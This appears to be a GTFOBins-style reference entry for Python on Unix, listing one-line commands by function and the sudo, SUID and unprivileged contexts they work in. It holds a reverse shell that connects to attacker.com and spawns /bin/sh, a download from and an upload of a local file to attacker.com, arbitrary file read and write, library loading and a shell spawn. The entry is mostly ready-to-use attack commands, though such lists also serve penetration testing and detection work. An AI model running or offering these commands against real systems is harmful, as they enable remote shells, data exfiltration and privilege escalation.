---
type: gtfobin
name: python
platform: Unix
functions: [download, file-read, file-write, library-load, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# python

## download

```bash
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
python -c 'print(open("/path/to/input-file").read())'
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
python -c 'open("/path/to/output-file","w+").write("DATA")'
```
**Contexts:** sudo, suid, unprivileged

## library-load

```bash
python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
```
**Contexts:** capabilities, sudo, suid, unprivileged

## reverse-shell

```bash
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("attacker.com",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
python -c 'import os; os.execl("/bin/sh", "sh")'
```
**Contexts:** capabilities, sudo, suid, unprivileged

## upload

```bash
python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'
```
**Contexts:** sudo, suid, unprivileged

```bash
python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'
```
**Contexts:** sudo, suid, unprivileged
